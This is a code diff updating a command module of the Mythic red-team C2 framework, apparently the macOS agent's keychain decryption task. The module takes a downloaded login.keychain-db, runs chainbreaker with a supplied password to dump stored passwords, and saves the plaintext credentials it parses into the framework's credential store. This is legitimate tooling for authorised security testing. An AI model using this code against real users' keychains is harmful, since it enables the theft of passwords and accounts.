@@ -4,6 +4,7 @@ from mythic_container.MythicRPC import *
 import sys
 import base64
 import asyncio
+import tempfile
 
 
 class DecryptKeychainArguments(TaskArguments):
@@ -63,57 +64,69 @@ class DecryptKeychainCommand(CommandBase):
     argument_class = DecryptKeychainArguments
     script_only = True
 
-    async def process_response(self, response: AgentResponse):
-        pass
+    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
+        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
+        return resp
 
-    async def create_tasking(self, task: MythicTask) -> MythicTask:
-        password = task.args.get_arg("password")
-        getkeychainDBResp = await MythicRPC().execute("get_file",
-                                                      task_id=task.id,
-                                                      file_id=task.args.get_arg("file_id"),
-                                                      limit_by_callback=True,
-                                                      max_results=1,
-                                                      get_contents=True)
-        if getkeychainDBResp.status == MythicRPCStatus.Success and len(getkeychainDBResp.response) > 0:
-            getkeychainDBResp = getkeychainDBResp.response[0]
-        else:
-            await MythicRPC().execute("create_output", task_id=task.id,
-                output="Encountered an error attempting to get downloaded file: " + getkeychainDBResp.error)
-            task.status = MythicStatus("Error: Failed to get keychain file")
-            return task
+    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
+        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
+            TaskID=taskData.Task.ID,
+            Success=True,
+        )
+        password = taskData.args.get_arg("password")
+        getkeychainDBResp = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
+            AgentFileId=taskData.args.get_arg("file_id"),
+        ))
+
+        if not getkeychainDBResp.Success:
+            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                TaskID=taskData.Task.ID,
+                Response=f"Failed to download file: {getkeychainDBResp.Error}".encode()
+            ))
+            response.Success = False
+            response.Error = "Failed to get file"
+            return response
 
         ## Write the downloaded login.keychain-db file to a new file on disk
         try:
             f = open("tmp_login.keychain-db", "wb")
-            f.write(base64.b64decode(getkeychainDBResp["contents"]))
+            f.write(getkeychainDBResp.Content)
             f.close()
         except Exception as e:
-            await MythicRPC().execute("create_output", task_id=task.id,
-                                      output="Encountered an error attempting to write the keychainDB to a file: " + str(e))
-            remove_temp_files()
-            task.status = MythicStatus("Error: Failed to write file to disk")
-            return task
+            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                TaskID=taskData.Task.ID,
+                Response=f"Encountered an error attempting to write the keychainDB to a file: {e} ".encode()
+            ))
+            response.Success = False
+            response.Error = "Failed to write file to disk"
+            return response
         ## Decrypt Keychain and export keys to files
         try:
             proc = await asyncio.create_subprocess_shell(
-                f"python2 /Mythic/mythic/chainbreaker/chainbreaker.py --password=\"{password}\" --dump-generic-passwords tmp_login.keychain-db",
+                f"python3 -m chainbreaker --password=\"{password}\" --dump-generic-passwords {os.path.abspath(self.agent_code_path / '..' / '..' /'tmp_login.keychain-db')}",
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
+                cwd=str(self.agent_code_path / ".." )
             )
             stdout, stderr = await proc.communicate()
             stdout = stdout.decode()
             stderr = stderr.decode()
-            await MythicRPC().execute("create_output",
-                                      task_id=task.id,
-                                      output=f"Keychain Decrypted:\n{stdout}\n\nErrors from Decrypting:\n{stderr}")
+            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                TaskID=taskData.Task.ID,
+                Response=f"Keychain Decrypted:\n{stdout}\n\nErrors from Decrypting:\n{stderr}".encode()
+            ))
             if len(stderr) > 0:
-                task.status = MythicStatus("Error: Chainbreaker failed")
-                return task
+                response.Success = False
+                response.TaskStatus = "error: Chainbreaker error"
+                return response
         except Exception as e:
-            await MythicRPC().execute("create_output", task_id=task.id,
-                                      output="Chainbreaker script failed with error: " + str(e))
-            task.status = MythicStatus("Error: Chainbreaker failed")
-            return task
+            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                TaskID=taskData.Task.ID,
+                Response=f"Chainbreaker script failed with error: {e}\n".encode()
+            ))
+            response.Success = False
+            response.TaskStatus = "error: Chainbreaker error"
+            return response
         ## Remove the login.keychain-db file from disk
         remove_temp_files()
 
@@ -125,7 +138,6 @@ class DecryptKeychainCommand(CommandBase):
             "credential": "",
             "realm": ""
         }
-        chrome_storage_password = ""
         for line in stdout.split("\n"):
             if "[+] Generic Password Record" in line:
                 sys.stdout.flush()
@@ -136,8 +148,6 @@ class DecryptKeychainCommand(CommandBase):
                         "credential": ccs_item["credential"],
                         "realm": ccs_item["realm"]
                     })
-                    if ccs_item["realm"] == "Chrome Safe Storage":
-                        chrome_storage_password = ccs_item["credential"]
                 ccs_item = {
                     "account": "",
                     "comment": "",
@@ -145,46 +155,59 @@ class DecryptKeychainCommand(CommandBase):
                     "realm": ""
                 }
             elif "[-] Print Name:" in line:
-                ccs_item["comment"] = ccs_item["comment"] + line.split(":")[-1].strip() + f" {task.args.get_arg('username')}"
+                ccs_item["comment"] = ccs_item["comment"] + line.split(":")[-1].strip()
+                if ccs_item["comment"].startswith("b'"):
+                    ccs_item["comment"] = ccs_item["comment"][2:-1]
+                ccs_item["comment"] = f"\n{taskData.args.get_arg('username')}\n" + ccs_item["comment"]
             elif "[-] Account:" in line:
                 ccs_item["account"] = line.split(":")[-1].strip()
+                if ccs_item["account"].startswith("b'"):
+                    ccs_item["account"] = ccs_item["account"][2:-1]
             elif "[-] Service:" in line:
                 ccs_item["realm"] = line.split(":")[-1].strip()
+                if ccs_item["realm"].startswith("b'"):
+                    ccs_item["realm"] = ccs_item["realm"][2:-1]
             elif "Password:" in line:
                 ccs_item["credential"] = line.split(":")[-1].strip()
+                if ccs_item["credential"].startswith("b'"):
+                    ccs_item["credential"] = ccs_item["credential"][2:-1]
         if ccs_item["credential"] != "":
             ccs_passwords.append(ccs_item)
-        await MythicRPC().execute("create_output", task_id=task.id,
-                                  output="\n-----------------\n")
+        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+            TaskID=taskData.Task.ID,
+            Response="\n-----------------\n".encode()
+        ))
         for cred in ccs_passwords:
-            create_cred_resp = await MythicRPC().execute("create_credential",
-                                                         task_id=task.id,
-                                                         credential_type="plaintext",
-                                                         account=cred["account"],
-                                                         realm=cred["realm"],
-                                                         credential=cred["credential"],
-                                                         comment=cred["comment"])
-            if create_cred_resp.status == MythicRPCStatus.Success:
-                await MythicRPC().execute("create_output",
-                                          task_id=task.id,
-                                          output=f"[*] Added credential for {cred['realm']}\n")
-        task.status = MythicStatus.Completed
-        return task
+            create_cred_resp = await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
+                TaskID=taskData.Task.ID,
+                Credentials=[MythicRPCCredentialData(**cred)]
+            ))
+            if create_cred_resp.Success:
+                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                    TaskID=taskData.Task.ID,
+                    Response=f"[*] Added credential: {cred}\n".encode()
+                ))
+            else:
+                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
+                    TaskID=taskData.Task.ID,
+                    Response=f"[-] Failed to add credential: {cred}\n".encode()
+                ))
+        return response
 
 
 def remove_temp_files():
     try:
-        if os.path.isfile('/Mythic/mythic/tmp_Cookies'):
-            os.remove('/Mythic/mythic/tmp_Cookies')
+        if os.path.isfile('tmp_Cookies'):
+            os.remove('tmp_Cookies')
     except Exception as e:
         raise Exception("Failed to remove apfell/mythic/tmp_Cookies file")
     try:
-        if os.path.isfile('/Mythic/mythic/cookies.json'):
-            os.remove('/Mythic/mythic/cookies.json')
+        if os.path.isfile('cookies.json'):
+            os.remove('cookies.json')
     except Exception as e:
         raise Exception("Failed to remove apfell/mythic/cookies.json file")
     try:
-        if os.path.isfile('/Mythic/mythic/tmp_login.keychain-db'):
-            os.remove('/Mythic/mythic/tmp_login.keychain-db')
+        if os.path.isfile('tmp_login.keychain-db'):
+            os.remove('tmp_login.keychain-db')
     except Exception as e:
         raise Exception("Failed to remove apfell/mythic/tmp_login.keychain-db")
